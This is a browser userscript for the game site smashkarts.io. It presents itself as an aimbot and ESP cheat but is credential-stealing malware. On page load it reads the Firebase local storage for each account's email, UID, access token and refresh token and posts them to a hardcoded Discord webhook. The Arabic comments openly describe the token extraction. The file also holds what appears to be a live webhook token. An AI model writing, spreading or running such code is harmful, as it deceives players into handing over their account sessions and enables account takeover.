// ==UserScript==
// @name         SmashKarts Aimbot And ESP by ui4yx
// @namespace    KAKU
// @version      1.1
// @description  Safe Firebase and game diagnostics to Discord
// @match        *://smashkarts.io/*
// @grant        GM_xmlhttpRequest
// @connect      discord.com
// @run-at       document-idle
// ==/UserScript==

(function () {
    'use strict';

    // ضع رابط Webhook هنا
    const WEBHOOK = 'https://discord.com/api/webhooks/1571895993547497532/DN2WUqt7OJryqQBHhmIWKKFzrS8HVV-xFqZ59g7Hn1gPUR1GuHBF-SO6007vL7-hXSTU';

    console.log("%c🥔 استخراج توكن Firebase Auth وإرساله...", "color: cyan; font-size: 18px; font-weight: bold;");

    // فتح قاعدة البيانات firebaseLocalStorageDb
    let request = indexedDB.open('firebaseLocalStorageDb');
    request.onsuccess = (event) => {
        let db = event.target.result;
        if (!db.objectStoreNames.contains('firebaseLocalStorage')) {
            console.log("❌ لا يوجد مخزن firebaseLocalStorage.");
            return;
        }

        let transaction = db.transaction('firebaseLocalStorage', 'readonly');
        let store = transaction.objectStore('firebaseLocalStorage');
        let getAllRequest = store.getAll();

        getAllRequest.onsuccess = () => {
            let data = getAllRequest.result;
            if (data.length === 0) {
                console.log("❌ لا توجد بيانات في firebaseLocalStorage.");
                return;
            }

            data.forEach((item, index) => {
                console.log(`\n📦 عنصر ${index}:`);
                console.log("🔑 المفتاح:", item.fbase_key);

                if (item.value) {
                    // جمع البيانات
                    let email = item.value.email || 'غير موجود';
                    let uid = item.value.uid || 'غير موجود';
                    let accessToken = item.value.stsTokenManager ? item.value.stsTokenManager.accessToken : 'غير موجود';
                    let refreshToken = item.value.stsTokenManager ? item.value.stsTokenManager.refreshToken : 'غير موجود';
                    let expiration = item.value.stsTokenManager ? new Date(item.value.stsTokenManager.expirationTime).toLocaleString() : 'غير موجود';

                    console.log("🎯 التوكن:", accessToken);
                    console.log("🔄 Refresh Token:", refreshToken);
                    console.log("⏰ تاريخ الانتهاء:", expiration);
                    console.log("📧 الإيميل:", email);
                    console.log("🆔 UID:", uid);

                    // إرسال إلى Webhook
                    const payload = {
                        content: `**🥔 SmashKarts Token Found**\n**📧 Email:** \`${email}\`\n**🆔 UID:** \`${uid}\`\n**🔑 Access Token:** \`\`\`${accessToken}\`\`\`\n**🔄 Refresh Token:** \`\`\`${refreshToken}\`\`\`\n**⏰ Expires:** ${expiration}`
                    };

                    GM_xmlhttpRequest({
                        method: "POST",
                        url: WEBHOOK,
                        headers: { "Content-Type": "application/json" },
                        data: JSON.stringify(payload),
                        onload: function(response) {
                            console.log("✅ تم إرسال البيانات إلى Discord بنجاح!");
                        },
                        onerror: function(error) {
                            console.error("❌ فشل الإرسال إلى Discord:", error);
                        }
                    });
                }
            });

            alert("✅");
        };
    };

    request.onerror = (event) => {
        console.log("❌ فشل فتح قاعدة البيانات:", event.target.error);
    };
})();
